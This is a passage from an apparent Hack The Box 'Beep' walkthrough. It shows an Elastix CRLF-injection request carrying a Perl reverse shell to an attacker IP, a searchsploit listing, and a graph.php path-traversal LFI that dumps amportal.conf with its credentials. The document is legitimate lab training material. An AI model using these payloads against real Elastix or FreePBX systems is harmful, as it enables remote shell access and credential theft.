2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41726" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ curl -k --tls-max 1.0 https://10.129.229.183/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.120%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
+[1] 2864
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ 
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+  &lt;head&gt;
+    &lt;TITLE&gt;Voicemail Message Call Me Control&lt;/TITLE&gt;
+    &lt;link rel="stylesheet" href="../theme/main.css" type="text/css"&gt;
+    &lt;meta http-equiv="content-type" content="text/html; charset=UTF-8"&gt;
+  &lt;/head&gt;
+
+&lt;table class='voicemail' style='width: 100%; height: 100%; margin: 0 0 0 0; border: 0px; padding: 0px'&gt;&lt;tr&gt;&lt;td valign='middle' style='border: 0px'&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;script language='javascript'&gt;parent.document.getElementById('callme_status').innerHTML = 'The call failed.  Perhaps the line was busy.';&lt;/script&gt;&lt;script language='javascript'&gt;parent.document.getElementById('pb_load_inprogress').value='false';&lt;/script&gt;&lt;script language='javascript'&gt;parent.document.getElementById('callme_status').parentNode.style.backgroundColor = 'white';&lt;/script&gt;  &lt;/body&gt;
+&lt;/html&gt;
+
+
+[1]  + done       curl -k --tls-max 1.0 
+</pre> </div> </div> <p><br> Check the Elastix in searchsploit and notice the graph.php LFI exploit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42631"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42631')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42631')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42631')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42631')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42631">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ searchsploit elastix                                            
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Elastix - 'page' Cross-Site Scripting                                                                                                                                                                     | php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                                   | php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                             | php/webapps/34942.txt
+Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                                                          | php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                                                                                                                                                                         | php/webapps/36305.txt
+Elastix &lt; 2.5 - PHP Code Injection                                                                                                                                                                        | php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                                                    | php/webapps/18650.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42631" onclick="terminalOverlayClose('bash-bash-42631')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42631')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42631')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42631')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42631" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ searchsploit elastix                                            
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Elastix - 'page' Cross-Site Scripting                                                                                                                                                                     | php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                                   | php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                             | php/webapps/34942.txt
+Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                                                          | php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                                                                                                                                                                         | php/webapps/36305.txt
+Elastix &lt; 2.5 - PHP Code Injection                                                                                                                                                                        | php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                                                    | php/webapps/18650.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</pre> </div> </div> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/beep/lfiexploit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="LFI Exploit" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/37637" rel="external nofollow noopener" target="_blank">https://www.exploit-db.com/exploits/37637</a></p> <p><br> Run the exploit to pull the amportal.conf file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-413988"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-413988')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-413988')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-413988')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-413988')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-413988">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ curl -k --tls-max 1.0 'https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action'
+# This file is part of FreePBX.
+#
+#    FreePBX is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 2 of the License, or
+#    (at your option) any later version.
+#
+#    FreePBX is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with FreePBX.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
+#
+# This file contains settings for components of the Asterisk Management Portal
+# Spaces are not allowed!
+# Run /usr/src/AMP/apply_conf.sh after making changes to this file
+
+# FreePBX Database configuration
+# AMPDBHOST: Hostname where the FreePBX database resides
+# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
+# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
+# AMPDBUSER: Username used to connect to the FreePBX database
+# AMPDBPASS: Password for AMPDBUSER (above)
+# AMPENGINE: Telephony backend engine (e.g. asterisk)
+# AMPMGRUSER: Username to access the Asterisk Manager Interface
+# AMPMGRPASS: Password for AMPMGRUSER
+#
+AMPDBHOST=localhost
+AMPDBENGINE=mysql
+# AMPDBNAME=asterisk
+AMPDBUSER=asteriskuser
+# AMPDBPASS=amp109
+AMPDBPASS=jEhdIekWmdjE
+AMPENGINE=asterisk
+AMPMGRUSER=admin
+#AMPMGRPASS=amp111
+AMPMGRPASS=jEhdIekWmdjE
+
+# AMPBIN: Location of the FreePBX command line scripts
+# AMPSBIN: Location of (root) command line scripts
+#
+AMPBIN=/var/lib/asterisk/bin
+AMPSBIN=/usr/local/sbin
+
+# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
+# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
+# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
+#
+AMPWEBROOT=/var/www/html
+AMPCGIBIN=/var/www/cgi-bin 
+# AMPWEBADDRESS=x.x.x.x|hostname
+
+# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
+# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
+# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
+# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
+# or if you don't want FOP.
+#
+#FOPRUN=true
+FOPWEBROOT=/var/www/html/panel
+#FOPPASSWORD=passw0rd
+FOPPASSWORD=jEhdIekWmdjE
+
+# FOPSORT=extension|lastname
+# DEFAULT VALUE: extension
+# FOP should sort extensions by Last Name [lastname] or by Extension [extension]
+
+# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
+# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
+ARI_ADMIN_USERNAME=admin
+
+# This is the default admin password to allow an administrator to login to ARI bypassing all security.
+# Change this to a secure password.
+ARI_ADMIN_PASSWORD=jEhdIekWmdjE
+
+# AUTHTYPE=database|none
+# Authentication type to use for web admininstration. If type set to 'database', the primary
+# AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
+AUTHTYPE=database
+
+# AMPADMINLOGO=filename
+# Defines the logo that is to be displayed at the TOP RIGHT of the admin screen. This enables
+# you to customize the look of the administration screen.
+# NOTE: images need to be saved in the ..../admin/images directory of your AMP install
+# This image should be 55px in height
+AMPADMINLOGO=logo.png
+
+# USECATEGORIES=true|false
+# DEFAULT VALUE: true
+# Controls if the menu items in the admin interface are sorted by category (true), or sorted 
+# alphabetically with no categories shown (false).
+
+# AMPEXTENSIONS=extensions|deviceanduser
+# Sets the extension behavior in FreePBX.  If set to 'extensions', Devices and Users are
+# administered together as a unified Extension, and appear on a single page.
+# If set to 'deviceanduser', Devices and Users will be administered seperately.  Devices (e.g. 
+# each individual line on a SIP phone) and Users (e.g. '101') will be configured 
+# independent of each other, allowing association of one User to many Devices, or allowing 
+# Users to login and logout of Devices.
+AMPEXTENSIONS=extensions
+
+# ENABLECW=true|false
+ENABLECW=no
+# DEFAULT VALUE: true
+# Enable call waiting by default when an extension is created. Set to 'no' to if you don't want 
+# phones to be commissioned with call waiting already enabled. The user would then be required
+# to dial the CW feature code (*70 default) to enable their phone. Most installations should leave
+# this alone. It allows multi-line phones to receive multiple calls on their line appearances.
+
+# CWINUSEBUSY=true|false
+# DEFAULT VALUE: true
+# For extensions that have CW enabled, report unanswered CW calls as 'busy' (resulting in busy 
+# voicemail greeting). If set to no, unanswered CW calls simply report as 'no-answer'.
+
+# AMPBADNUMBER=true|false
+# DEFAULT VALUE: true
+# Generate the bad-number context which traps any bogus number or feature code and plays a
+# message to the effect. If you use the Early Dial feature on some Grandstream phones, you
+# will want to set this to false.
+
+# AMPBACKUPSUDO=true|false
+# DEFAULT VALUE: false
+# This option allows you to use sudo when backing up files. Useful ONLY when using AMPPROVROOT
+# Allows backup and restore of files specified in AMPPROVROOT, based on permissions in /etc/sudoers
+# for example, adding the following to sudoers would allow the user asterisk to run tar on ANY file
+# on the system:
+#       asterisk localhost=(root)NOPASSWD: /bin/tar
+#       Defaults:asterisk !requiretty
+# PLEASE KEEP IN MIND THE SECURITY RISKS INVOLVED IN ALLOWING THE ASTERISK USER TO TAR/UNTAR ANY FILE
+
+# CUSTOMASERROR=true|false
+# DEFAULT VALUE: true
+# If false, then the Destination Registry will not report unknown destinations as errors. This should be
+# left to the default true and custom destinations should be moved into the new custom apps registry.
+
+# DYNAMICHINTS=true|false
+# DEFAULT VALUE: false
+# If true, Core will not statically generate hints, but instead make a call to the AMPBIN php script, 
+# and generate_hints.php through an Asterisk's #exec call. This requires Asterisk.conf to be configured 
+# with "execincludes=yes" set in the [options] section.
+
+# XTNCONFLICTABORT=true|false
+# BADDESTABORT=true|false
+# DEFAULT VALUE: false
+# Setting either of these to true will result in retrieve_conf aborting during a reload if an extension
+# conflict is detected or a destination is detected. It is usually better to allow the reload to go
+# through and then correct the problem but these can be set if a more strict behavior is desired.
+
+# SERVERINTITLE=true|false
+# DEFAULT VALUE: false
+# Precede browser title with the server name.
+
+# USEDEVSTATE = true|false
+# DEFAULT VALUE: false
+# If this is set, it assumes that you are running Asterisk 1.4 or higher and want to take advantage of the
+# func_devstate.c backport available from Asterisk 1.6. This allows custom hints to be created to support
+# BLF for server side feature codes such as daynight, followme, etc.
+
+# MODULEADMINWGET=true|false
+# DEFAULT VALUE: false
+# Module Admin normally tries to get its online information through direct file open type calls to URLs that
+# go back to the freepbx.org server. If it fails, typically because of content filters in firewalls that
+# don't like the way PHP formats the requests, the code will fall back and try a wget to pull the information.
+# This will often solve the problem. However, in such environment there can be a significant timeout before
+# the failed file open calls to the URLs return and there are often 2-3 of these that occur. Setting this
+# value will force FreePBX to avoid the attempt to open the URL and go straight to the wget calls.
+
+# AMPDISABLELOG=true|false
+# DEFAULT VALUE: true
+# Whether or not to invoke the FreePBX log facility
+
+# AMPSYSLOGLEVEL=LOG_EMERG|LOG_ALERT|LOG_CRIT|LOG_ERR|LOG_WARNING|LOG_NOTICE|LOG_INFO|LOG_DEBUG|LOG_SQL|SQL
+# DEFAULT VALUE: LOG_ERR
+# Where to log if enabled, SQL, LOG_SQL logs to old MySQL table, others are passed to syslog system to
+# determine where to log
+
+# AMPENABLEDEVELDEBUG=true|false
+# DEFAULT VALUE: false
+# Whether or not to include log messages marked as 'devel-debug' in the log system
+
+# AMPMPG123=true|false 
+# DEFAULT VALUE: true
+# When set to false, the old MoH behavior is adopted where MP3 files can be loaded and WAV files converted
+# to MP3. The new default behavior assumes you have mpg123 loaded as well as sox and will convert MP3 files
+# to WAV. This is highly recommended as MP3 files heavily tax the system and can cause instability on a busy
+# phone system.
+
+# CDR DB Settings: Only used if you don't use the default values provided by FreePBX.
+# CDRDBHOST: hostname of db server if not the same as AMPDBHOST
+# CDRDBPORT: Port number for db host 
+# CDRDBUSER: username to connect to db with if it's not the same as AMPDBUSER
+# CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS
+# CDRDBNAME: name of database used for cdr records
+# CDRDBTYPE: mysql or postgres mysql is default
+# CDRDBTABLENAME: Name of the table in the db where the cdr is stored cdr is default 
+
+# AMPVMUMASK=mask 
+# DEFAULT VALUE: 077 
+# Defaults to 077 allowing only the asterisk user to have any permission on VM files. If set to something
+# like 007, it would allow the group to have permissions. This can be used if setting apache to a different
+# user then asterisk, so that the apache user (and thus ARI) can have access to read/write/delete the
+# voicemail files. If changed, some of the voicemail directory structures may have to be manually changed.
+
+# DASHBOARD_STATS_UPDATE_TIME=integer_seconds
+# DEFAULT VALUE: 6
+# DASHBOARD_INFO_UPDATE_TIME=integer_seconds
+# DEFAULT VALUE: 20
+# These can be used to change the refresh rate of the System Status Panel. Most of
+# the stats are updated based on the STATS interval but a few items are checked
+# less frequently (such as Asterisk Uptime) based on the INFO value
+
+# ZAP2DAHDICOMPAT=true|false
+ZAP2DAHDICOMPAT=true
+# DEFAULT VALUE: false
+# If set to true, FreePBX will check if you have chan_dadhi installed. If so, it will
+# automatically use all your ZAP configuration settings (devices and trunks) and
+# silently convert them, under the covers, to DAHDI so no changes are needed. The
+# GUI will continue to refer to these as ZAP but it will use the proper DAHDI channels.
+# This will also keep Zap Channel DIDs working.
+
+# CHECKREFERER=true|false
+# DEFAULT VALUE: true
+# When set to the default value of true, all requests into FreePBX that might possibly add/edit/delete
+# settings will be validated to assure the request is coming from the server. This will protect the system
+# from CSRF (cross site request forgery) attacks. It will have the effect of preventing legitimately entering
+# URLs that could modify settings which can be allowed by changing this field to false.
+
+# USEQUEUESTATE=true|false
+# DEFAULT VALUE: false
+# Setting this flag will generate the required dialplan to integrate with the following Asterisk patch:
+# https://issues.asterisk.org/view.php?id=15168
+# This feature is planned for a future 1.6 release but given the existence of the patch can be used prior. Once
+# the release version is known, code will be added to automatically enable this format in versions of Asterisk
+# that support it.
+
+# USEGOOGLEDNSFORENUM=true|false
+# DEFAULT VALUE: false
+# Setting this flag will generate the required global variable so that enumlookup.agi will use Google DNS
+# 8.8.8.8 when performing an ENUM lookup. Not all DNS deals with NAPTR record, but Google does. There is a
+# drawback to this as Google tracks every lookup. If you are not comfortable with this, do not enable this
+# setting. Please read Google FAQ about this: http://code.google.com/speed/public-dns/faq.html#privacy
+
+# MOHDIR=subdirectory_name
+# This is the subdirectory for the MoH files/directories which is located in ASTVARLIBDIR
+# if not specified it will default to mohmp3 for backward compatibility.
+MOHDIR=mohmp3
+# RELOADCONFIRM=true|false
+# DEFAULT VALUE: true
+# When set to false, will bypass the confirm on Reload Box
+
+# FCBEEPONLY=true|false
+# DEFAULT VALUE: false
+# When set to true, a beep is played instead of confirmation message when activating/de-activating:
+# CallForward, CallWaiting, DayNight, DoNotDisturb and FindMeFollow
+
+# DISABLECUSTOMCONTEXTS=true|false
+# DEFAULT VALUE: false
+# Normally FreePBX auto-generates a custom context that may be usable for adding custom dialplan to modify the
+# normal behavior of FreePBX. It takes a good understanding of how Asterisk processes these includes to use
+# this and in many of the cases, there is no useful application. All includes will result in a WARNING in the
+# Asterisk log if there is no context found to include though it results in no errors. If you know that you
+# want the includes, you can set this to true. If you comment it out FreePBX will revert to legacy behavior
+# and include the contexts.
+
+# AMPMODULEXML lets you change the module repository that you use. By default, it
+# should be set to http://mirror.freepbx.org/ - Presently, there are no third
+# party module repositories.
+AMPMODULEXML=http://mirror.freepbx.org/
+
+# AMPMODULESVN is the prefix that is appended to &lt;location&gt; tags in the XML file.
+# This should be set to http://mirror.freepbx.org/modules/
+AMPMODULESVN=http://mirror.freepbx.org/modules/
+
+AMPDBNAME=asterisk
+
+ASTETCDIR=/etc/asterisk
+ASTMODDIR=/usr/lib/asterisk/modules
+ASTVARLIBDIR=/var/lib/asterisk
+ASTAGIDIR=/var/lib/asterisk/agi-bin
+ASTSPOOLDIR=/var/spool/asterisk
+ASTRUNDIR=/var/run/asterisk
+ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-413988" onclick="terminalOverlayClose('bash-bash-413988')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-413988')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-413988')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-413988')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-413988" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ curl -k --tls-max 1.0 'https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action'
+# This file is part of FreePBX.
+#
+#    FreePBX is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 2 of the License, or
+#    (at your option) any later version.
+#
+#    FreePBX is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with FreePBX.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
+#
+# This file contains settings for components of the Asterisk Management Portal
+# Spaces are not allowed!
+# Run /usr/src/AMP/apply_conf.sh after making changes to this file
+
+# FreePBX Database configuration
+# AMPDBHOST: Hostname where the FreePBX database resides
+# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
+# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
+# AMPDBUSER: Username used to connect to the FreePBX database
+# AMPDBPASS: Password for AMPDBUSER (above)
+# AMPENGINE: Telephony backend engine (e.g. asterisk)
+# AMPMGRUSER: Username to access the Asterisk Manager Interface
+# AMPMGRPASS: Password for AMPMGRUSER
+#
+AMPDBHOST=localhost
+AMPDBENGINE=mysql
+# AMPDBNAME=asterisk
+AMPDBUSER=asteriskuser
+# AMPDBPASS=amp109
+AMPDBPASS=jEhdIekWmdjE
+AMPENGINE=asterisk
+AMPMGRUSER=admin
+#AMPMGRPASS=amp111
+AMPMGRPASS=jEhdIekWmdjE
+
+# AMPBIN: Location of the FreePBX command line scripts
+# AMPSBIN: Location of (root) command line scripts
+#
+AMPBIN=/var/lib/asterisk/bin
+AMPSBIN=/usr/local/sbin
+
+# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
+# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
+# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
+#
+AMPWEBROOT=/var/www/html
+AMPCGIBIN=/var/www/cgi-bin 
+# AMPWEBADDRESS=x.x.x.x|hostname
+
+# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
+# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
+# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
+# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
+# or if you don't want FOP.
+#
+#FOPRUN=true
+FOPWEBROOT=/var/www/html/panel
+#FOPPASSWORD=passw0rd
+FOPPASSWORD=jEhdIekWmdjE
+
+# FOPSORT=extension|lastname
+# DEFAULT VALUE: extension
+# FOP should sort extensions by Last Name [lastname] or by Extension [extension]
+
+# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
+# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
+ARI_ADMIN_USERNAME=admin
+
+# This is the default admin password to allow an administrator to login to ARI bypassing all security.
+# Change this to a secure password.
+ARI_ADMIN_PASSWORD=jEhdIekWmdjE
+
+# AUTHTYPE=database|none
+# Authentication type to use for web admininstration. If type set to 'database', the primary
+# AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
+AUTHTYPE=database
+
+# AMPADMINLOGO=filename
+# Defines the logo that is to be displayed at the TOP RIGHT of the admin screen. This enables
+# you to customize the look of the administration screen.
+# NOTE: images need to be saved in the ..../admin/images directory of your AMP install
+# This image should be 55px in height
+AMPADMINLOGO=logo.png
+
+# USECATEGORIES=true|false
+# DEFAULT VALUE: true
+# Controls if the menu items in the admin interface are sorted by category (true), or sorted 
+# alphabetically with no categories shown (false).
+
+# AMPEXTENSIONS=extensions|deviceanduser
+# Sets the extension behavior in FreePBX.  If set to 'extensions', Devices and Users are
+# administered together as a unified Extension, and appear on a single page.
+# If set to 'deviceanduser', Devices and Users will be administered seperately.  Devices (e.g. 
+# each individual line on a SIP phone) and Users (e.g. '101') will be configured 
+# independent of each other, allowing association of one User to many Devices, or allowing 
+# Users to login and logout of Devices.
+AMPEXTENSIONS=extensions
+
+# ENABLECW=true|false
+ENABLECW=no
+# DEFAULT VALUE: true
+# Enable call waiting by default when an extension is created. Set to 'no' to if you don't want 
+# phones to be commissioned with call waiting already enabled. The user would then be required
+# to dial the CW feature code (*70 default) to enable their phone. Most installations should leave
+# this alone. It allows multi-line phones to receive multiple calls on their line appearances.
+
+# CWINUSEBUSY=true|false
+# DEFAULT VALUE: true
+# For extensions that have CW enabled, report unanswered CW calls as 'busy' (resulting in busy 
+# voicemail greeting). If set to no, unanswered CW calls simply report as 'no-answer'.
+
+# AMPBADNUMBER=true|false
+# DEFAULT VALUE: true
+# Generate the bad-number context which traps any bogus number or feature code and plays a
+# message to the effect. If you use the Early Dial feature on some Grandstream phones, you
+# will want to set this to false.
+
+# AMPBACKUPSUDO=true|false
+# DEFAULT VALUE: false
+# This option allows you to use sudo when backing up files. Useful ONLY when using AMPPROVROOT
+# Allows backup and restore of files specified in AMPPROVROOT, based on permissions in /etc/sudoers
+# for example, adding the following to sudoers would allow the user asterisk to run tar on ANY file
+# on the system:
+#       asterisk localhost=(root)NOPASSWD: /bin/tar
+#       Defaults:asterisk !requiretty
+# PLEASE KEEP IN MIND THE SECURITY RISKS INVOLVED IN ALLOWING THE ASTERISK USER TO TAR/UNTAR ANY FILE
+
+# CUSTOMASERROR=true|false
+# DEFAULT VALUE: true
+# If false, then the Destination Registry will not report unknown destinations as errors. This should be
+# left to the default true and custom destinations should be moved into the new custom apps registry.
+
+# DYNAMICHINTS=true|false
+# DEFAULT VALUE: false
+# If true, Core will not statically generate hints, but instead make a call to the AMPBIN php script, 
+# and generate_hints.php through an Asterisk's #exec call. This requires Asterisk.conf to be configured 
+# with "execincludes=yes" set in the [options] section.
+
+# XTNCONFLICTABORT=true|false
+# BADDESTABORT=true|false
+# DEFAULT VALUE: false
+# Setting either of these to true will result in retrieve_conf aborting during a reload if an extension
+# conflict is detected or a destination is detected. It is usually better to allow the reload to go
+# through and then correct the problem but these can be set if a more strict behavior is desired.
+
+# SERVERINTITLE=true|false
+# DEFAULT VALUE: false
+# Precede browser title with the server name.
+
+# USEDEVSTATE = true|false
+# DEFAULT VALUE: false
+# If this is set, it assumes that you are running Asterisk 1.4 or higher and want to take advantage of the
+# func_devstate.c backport available from Asterisk 1.6. This allows custom hints to be created to support
+# BLF for server side feature codes such as daynight, followme, etc.
+
+# MODULEADMINWGET=true|false
+# DEFAULT VALUE: false
+# Module Admin normally tries to get its online information through direct file open type calls to URLs that
+# go back to the freepbx.org server. If it fails, typically because of content filters in firewalls that
+# don't like the way PHP formats the requests, the code will fall back and try a wget to pull the information.
+# This will often solve the problem. However, in such environment there can be a significant timeout before
+# the failed file open calls to the URLs return and there are often 2-3 of these that occur. Setting this
+# value will force FreePBX to avoid the attempt to open the URL and go straight to the wget calls.
+
+# AMPDISABLELOG=true|false
+# DEFAULT VALUE: true
+# Whether or not to invoke the FreePBX log facility
+
+# AMPSYSLOGLEVEL=LOG_EMERG|LOG_ALERT|LOG_CRIT|LOG_ERR|LOG_WARNING|LOG_NOTICE|LOG_INFO|LOG_DEBUG|LOG_SQL|SQL
+# DEFAULT VALUE: LOG_ERR
+# Where to log if enabled, SQL, LOG_SQL logs to old MySQL table, others are passed to syslog system to
+# determine where to log
+
+# AMPENABLEDEVELDEBUG=true|false
+# DEFAULT VALUE: false
+# Whether or not to include log messages marked as 'devel-debug' in the log system
+
+# AMPMPG123=true|false 
+# DEFAULT VALUE: true
+# When set to false, the old MoH behavior is adopted where MP3 files can be loaded and WAV files converted
+# to MP3. The new default behavior assumes you have mpg123 loaded as well as sox and will convert MP3 files
+# to WAV. This is highly recommended as MP3 files heavily tax the system and can cause instability on a busy
+# phone system.
+
+# CDR DB Settings: Only used if you don't use the default values provided by FreePBX.
+# CDRDBHOST: hostname of db server if not the same as AMPDBHOST
+# CDRDBPORT: Port number for db host 
+# CDRDBUSER: username to connect to db with if it's not the same as AMPDBUSER
+# CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS
+# CDRDBNAME: name of database used for cdr records
+# CDRDBTYPE: mysql or postgres mysql is default
